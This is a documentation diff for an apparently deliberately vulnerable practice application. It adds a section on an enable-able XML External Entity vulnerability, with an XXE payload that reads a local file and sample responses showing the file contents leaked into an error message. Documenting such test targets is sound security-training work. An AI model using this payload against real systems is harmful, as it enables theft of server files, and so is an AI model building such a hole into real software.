@@ -282,4 +282,22 @@ By default referrer check is performed on all POST requests and allowed host and
 If referrer check vulnerability is enabled for context, the check always passes successfully for all
  `Referrer` headers.
    
-   
+
+#### XMLExternalEntity vuln
+
+If you enable this vulnerability in rest.php config, it will be possible to use it by such requests (with XML bodies - for example POST, PUT,...):
+```xml
+<!DOCTYPE roottag [<!ENTITY goodies SYSTEM "file:///d:/script.txt">]>
+<roottag>&goodies;</roottag>
+```
+
+If Accept header is `application/json`, the result could be as follows:
+```json
+{"message":"Remove excess fields: goodies","code":400,"invalidFields":{"goodies":{"goodies":"The Content of \n the hidden file\n"},"customer_id":"1"}}
+```
+
+Without this vuln response body will be:
+```json
+{"message":"Remove excess fields: goodies","code":400}
+```
+
